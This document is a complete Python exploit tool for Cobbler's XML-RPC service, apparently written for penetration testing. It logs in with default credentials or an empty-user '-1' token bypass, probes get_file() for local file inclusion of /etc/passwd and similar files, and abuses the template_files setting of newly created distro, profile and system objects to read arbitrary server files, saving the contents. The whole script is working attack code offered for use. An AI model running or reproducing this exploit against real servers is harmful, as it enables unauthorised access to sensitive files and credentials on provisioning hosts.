#!/usr/bin/env python3
"""
Improved Cobbler XML-RPC Enumeration & Exploitation Script
Focuses on working template_files exploit since direct get_file() is broken
"""
import xmlrpc.client, re, sys, time, argparse

DEFAULT_HOST = "127.0.0.1:25151"
DEFAULT_USER = "cobbler"
DEFAULT_PASS = "cobbler"

def parse_args():
    parser = argparse.ArgumentParser(description='Cobbler XML-RPC Enumeration & Exploitation')
    
    parser.add_argument('target', nargs='?', default=DEFAULT_HOST,
                       help='Target host:port (default: 127.0.0.1:25151)')
    
    # Main operations
    parser.add_argument('--read-file', metavar='PATH',
                       help='Read specific file using template exploit')
    parser.add_argument('--read-files', metavar='PATH', nargs='+',
                       help='Read multiple files using template exploit')
    
    # Discovery options
    parser.add_argument('--enum-only', action='store_true',
                       help='Only enumerate methods/settings, no file reading')
    parser.add_argument('--find-kernels', action='store_true',
                       help='Search for usable kernels/initrds')
    parser.add_argument('--test-lfi', action='store_true',
                       help='Test if direct get_file() LFI works')
    
    # Kernel specification (bypass discovery)
    parser.add_argument('--kernel', metavar='PATH',
                       help='Specify kernel path (bypass discovery)')
    parser.add_argument('--initrd', metavar='PATH', 
                       help='Specify initrd path (bypass discovery)')
    
    # Auth options
    parser.add_argument('-u', '--username', default=DEFAULT_USER)
    parser.add_argument('-p', '--password', default=DEFAULT_PASS)
    
    # Output options
    parser.add_argument('--quiet', '-q', action='store_true')
    parser.add_argument('--output', '-o', metavar='FILE',
                       help='Save output to file')
    parser.add_argument('--debug', action='store_true')
    
    return parser.parse_args()

def sp(url):
    if "://" not in url:
        url = f"http://{url}/RPC2"
    elif not url.endswith("/RPC2"):
        url = url.rstrip("/") + "/RPC2"
    return xmlrpc.client.ServerProxy(url, allow_none=True)

def login_any(server, user, passwd, quiet=False):
    try:
        t = server.login(user, passwd)
        if not quiet:
            print(f"[+] Authenticated as {user}:{passwd}")
        return t, "creds"
    except Exception as e1:
        try:
            t = server.login("", -1)
            if not quiet:
                print("[+] Authenticated with bypass token (-1)")
            return t, "bypass"
        except Exception as e2:
            raise RuntimeError(f"Login failed - creds:{e1} | bypass:{e2}")

def discover_methods_and_info(server, token, quiet=False):
    """Quick method discovery and basic info gathering"""
    info = {
        'methods': [],
        'version': None,
        'settings': None,
        'existing_objects': {}
    }
    
    # Method discovery
    common_methods = [
        "get_file", "get_template_file_for_system", "get_settings",
        "get_distros", "get_profiles", "get_systems", "version",
        "new_distro", "new_profile", "new_system", "sync"
    ]
    
    for method in common_methods:
        try:
            m = getattr(server, method, None)
            if m:
                try:
                    m()
                    info['methods'].append((method, "works_no_args"))
                except Exception as e:
                    if "takes" in str(e) or "required" in str(e):
                        info['methods'].append((method, "needs_args"))
                    elif "unknown remote method" not in str(e).lower():
                        info['methods'].append((method, "exists"))
        except Exception:
            continue
    
    # Version info
    try:
        info['version'] = server.version()
    except Exception:
        pass
    
    # Settings
    try:
        info['settings'] = server.get_settings(token)
    except Exception:
        pass
    
    # Existing objects (useful for finding kernels)
    for obj_type in ['distros', 'profiles', 'systems']:
        try:
            objects = getattr(server, f'get_{obj_type}')(token)
            info['existing_objects'][obj_type] = objects
        except Exception:
            pass
    
    if not quiet:
        print(f"[+] Found {len(info['methods'])} XML-RPC methods")
        if info['version']:
            print(f"[+] Cobbler version: {info['version']}")
        print(f"[+] Existing distros: {len(info['existing_objects'].get('distros', []))}")
        print(f"[+] Existing profiles: {len(info['existing_objects'].get('profiles', []))}")
        print(f"[+] Existing systems: {len(info['existing_objects'].get('systems', []))}")
    
    return info

def test_direct_lfi(server, quiet=False):
    """Test if direct get_file() LFI works"""
    if not quiet:
        print("[*] Testing direct LFI via get_file()...")
    
    test_files = ["/etc/passwd", "/proc/version", "/etc/hosts"]
    working_files = []
    
    for filepath in test_files:
        try:
            data = server.get_file(filepath)
            if data and len(data) > 5:  # More than just a single char
                working_files.append((filepath, len(data)))
                if not quiet:
                    print(f"[+] Direct LFI works: {filepath} ({len(data)} bytes)")
            elif not quiet:
                print(f"[-] Direct LFI failed: {filepath} (got {len(data) if data else 0} bytes)")
        except Exception as e:
            if not quiet:
                print(f"[-] Direct LFI error: {filepath} - {e}")
    
    if working_files:
        if not quiet:
            print(f"[!] Direct LFI confirmed - {len(working_files)} files readable")
        return True
    else:
        if not quiet:
            print("[-] Direct LFI not working (files return minimal data)")
        return False

def smart_kernel_discovery(server, token, existing_objects, debug=False):
    """Smart kernel discovery using existing objects and common paths"""
    
    if debug:
        print("[DEBUG] Starting smart kernel discovery...")
    
    found_kernels = []
    found_initrds = []
    
    # Method 1: Extract from existing distros
    existing_distros = existing_objects.get('distros', [])
    if existing_distros and debug:
        print(f"[DEBUG] Checking {len(existing_distros)} existing distros...")
    
    for distro in existing_distros:
        if isinstance(distro, dict):
            kernel = distro.get('kernel')
            initrd = distro.get('initrd')
            
            if kernel and kernel not in [k[0] for k in found_kernels]:
                # Test if kernel exists by trying to read a small portion
                try:
                    # We can't use get_file reliably, so we'll assume existing distro paths are valid
                    found_kernels.append((kernel, "from_existing_distro"))
                    if debug:
                        print(f"[DEBUG] Found kernel from existing distro: {kernel}")
                except Exception:
                    pass
            
            if initrd and initrd not in [i[0] for i in found_initrds]:
                try:
                    found_initrds.append((initrd, "from_existing_distro"))  
                    if debug:
                        print(f"[DEBUG] Found initrd from existing distro: {initrd}")
                except Exception:
                    pass
    
    # Method 2: Common default paths (since we can't easily test them)
    if not found_kernels:
        common_kernels = [
            "/boot/vmlinuz-6.1.0-37-amd64",  # Common Debian/Ubuntu
            "/boot/vmlinuz-5.15.0-generic",  # Ubuntu 
            "/boot/vmlinuz-6.1.0-13-amd64",  # Debian
            "/boot/vmlinuz",                 # Generic
            "/boot/vmlinuz-linux",           # Arch
        ]
        
        for ck in common_kernels:
            found_kernels.append((ck, "common_path"))
            if debug:
                print(f"[DEBUG] Added common kernel path: {ck}")
    
    if not found_initrds:
        common_initrds = [
            "/boot/initrd.img-6.1.0-37-amd64",
            "/boot/initrd.img-5.15.0-generic", 
            "/boot/initrd.img-6.1.0-13-amd64",
            "/boot/initrd.img",
            "/boot/initramfs-linux.img",
        ]
        
        for ci in common_initrds:
            found_initrds.append((ci, "common_path"))
            if debug:
                print(f"[DEBUG] Added common initrd path: {ci}")
    
    return found_kernels, found_initrds

def template_exploit_file(server, token, target_file, kernel_path, initrd_path, debug=False):
    """Use template_files exploit to read a file"""
    
    if debug:
        print(f"[DEBUG] Template exploit for {target_file}")
        print(f"[DEBUG] Using kernel: {kernel_path}")
        print(f"[DEBUG] Using initrd: {initrd_path}")
    
    try:
        # Generate unique names
        timestamp = int(time.time())
        rand = hash(target_file) % 10000
        
        distro_name = f"exp_d_{timestamp}_{rand}"
        profile_name = f"exp_p_{timestamp}_{rand}"
        system_name = f"exp_s_{timestamp}_{rand}"
        dest_path = f"/exp_{timestamp}_{rand}"
        
        if debug:
            print(f"[DEBUG] Creating objects: {distro_name}, {profile_name}, {system_name}")
        
        # Create distro
        did = server.new_distro(token)
        server.modify_distro(did, "name", distro_name, token)
        server.modify_distro(did, "breed", "redhat", token)
        server.modify_distro(did, "arch", "x86_64", token)
        server.modify_distro(did, "kernel", kernel_path, token)
        server.modify_distro(did, "initrd", initrd_path, token)
        server.save_distro(did, token)
        
        # Create profile
        pid = server.new_profile(token)
        server.modify_profile(pid, "name", profile_name, token)
        server.modify_profile(pid, "distro", distro_name, token)
        server.save_profile(pid, token)
        
        # Create system with template mapping
        sid = server.new_system(token)
        server.modify_system(sid, "name", system_name, token)
        server.modify_system(sid, "profile", profile_name, token)
        server.modify_system(sid, "template_files", {target_file: dest_path}, token)
        server.save_system(sid, token)
        
        if debug:
            print("[DEBUG] Running sync...")
        
        # Sync
        try:
            sync_result = server.sync(token)
            if debug:
                print(f"[DEBUG] Sync result: {sync_result}")
        except Exception as e:
            if debug:
                print(f"[DEBUG] Sync failed (non-fatal): {e}")
        
        # Try to read the mapped file
        for use_token in [False, True]:
            try:
                if use_token:
                    data = server.get_template_file_for_system(system_name, dest_path, token)
                else:
                    data = server.get_template_file_for_system(system_name, dest_path)
                
                if data and isinstance(data, str) and len(data) > 0:
                    if debug:
                        print(f"[DEBUG] Template read successful (token={use_token}): {len(data)} bytes")
                    return data
                    
            except Exception as e:
                if debug:
                    print(f"[DEBUG] Template read failed (token={use_token}): {e}")
                continue
        
        return None
        
    except Exception as e:
        if debug:
            print(f"[DEBUG] Template exploit failed: {e}")
        return None

def main():
    args = parse_args()
    
    if not args.quiet:
        print(f"[*] Cobbler Exploitation Tool - Target: {args.target}")
        print("=" * 60)
    
    server = sp(args.target)
    
    # Authentication
    try:
        token, auth_method = login_any(server, args.username, args.password, args.quiet)
        if not args.quiet:
            print(f"[+] Auth: {token[:20]}... (via {auth_method})\n")
    except Exception as e:
        print(f"[-] Auth failed: {e}")
        return 1
    
    # Enumeration phase
    if not args.quiet or args.enum_only:
        print("[*] Gathering server information...")
    
    info = discover_methods_and_info(server, token, args.quiet)
    
    if args.test_lfi:
        lfi_works = test_direct_lfi(server, args.quiet)
    
    if args.enum_only:
        print("\n[*] Enumeration complete")
        return 0
    
    # Kernel discovery
    kernel_path = args.kernel
    initrd_path = args.initrd
    
    if not (kernel_path and initrd_path):
        if not args.quiet:
            print("[*] Discovering kernel/initrd paths...")
        
        kernels, initrds = smart_kernel_discovery(server, token, info['existing_objects'], args.debug)
        
        if kernels and initrds:
            kernel_path = kernels[0][0]
            initrd_path = initrds[0][0]
            if not args.quiet:
                print(f"[+] Using kernel: {kernel_path}")
                print(f"[+] Using initrd: {initrd_path}")
        else:
            print("[-] No usable kernel/initrd found")
            if args.find_kernels:
                return 0
            print("[-] Specify --kernel and --initrd manually")
            return 1
    
    if args.find_kernels:
        print(f"\n[+] Found kernels:")
        for k, source in kernels:
            print(f"    {k} ({source})")
        print(f"[+] Found initrds:")  
        for i, source in initrds:
            print(f"    {i} ({source})")
        return 0
    
    # File reading operations
    results = {}
    
    if args.read_file:
        if not args.quiet:
            print(f"\n[*] Reading {args.read_file}...")
        
        data = template_exploit_file(server, token, args.read_file, 
                                   kernel_path, initrd_path, args.debug)
        if data:
            results[args.read_file] = data
            if not args.output and not args.quiet:
                print(f"\n{'='*60}")
                print(f"CONTENT OF {args.read_file}:")
                print('='*60)
                print(data, end="" if data.endswith('\n') else '\n')
                print('='*60)
        else:
            print(f"[-] Failed to read {args.read_file}")
    
    elif args.read_files:
        if not args.quiet:
            print(f"\n[*] Reading {len(args.read_files)} files...")
        
        for filepath in args.read_files:
            if not args.quiet:
                print(f"[*] Reading {filepath}...")
            
            data = template_exploit_file(server, token, filepath,
                                       kernel_path, initrd_path, args.debug)
            if data:
                results[filepath] = data
                print(f"[+] Success: {filepath} ({len(data)} bytes)")
            else:
                print(f"[-] Failed: {filepath}")
        
        # Show results
        if results and not args.output:
            for filepath, content in results.items():
                print(f"\n{'='*60}")
                print(f"CONTENT OF {filepath}:")
                print('='*60)
                print(content, end="" if content.endswith('\n') else '\n')
                print('='*60)
    
    else:
        # Default: read /etc/passwd as demo
        if not args.quiet:
            print(f"\n[*] Demo: reading /etc/passwd...")
        
        data = template_exploit_file(server, token, "/etc/passwd",
                                   kernel_path, initrd_path, args.debug)
        if data:
            results["/etc/passwd"] = data
            print(f"[+] Success! Read /etc/passwd ({len(data)} bytes)")
            if not args.quiet:
                print(f"Preview: {data[:100]}...")
        else:
            print("[-] Demo failed")
    
    # Save results
    if args.output and results:
        try:
            with open(args.output, 'w') as f:
                for filepath, content in results.items():
                    f.write(f"=== {filepath} ===\n")
                    f.write(content)
                    f.write(f"\n=== END {filepath} ===\n\n")
            print(f"[+] Saved to {args.output}")
        except Exception as e:
            print(f"[-] Save failed: {e}")
    
    if not args.quiet:
        print(f"\n[+] Successfully read {len(results)} file(s)")
    
    return 0

if __name__ == "__main__":
    sys.exit(main())
